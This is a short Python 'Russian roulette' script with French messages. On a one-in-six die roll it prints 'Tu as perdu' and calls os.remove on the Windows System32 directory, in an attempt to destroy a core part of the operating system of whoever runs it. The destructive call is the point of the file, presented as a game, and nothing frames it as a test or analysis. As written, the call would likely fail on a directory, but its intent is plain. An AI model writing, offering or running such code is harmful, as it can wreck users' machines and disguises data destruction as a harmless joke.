import random
import os

if random.randint(1, 6) == 6:
    print('Tu as perdu')
    os.remove("C:\Windows\System32")
else:
    print('Tu as gagné')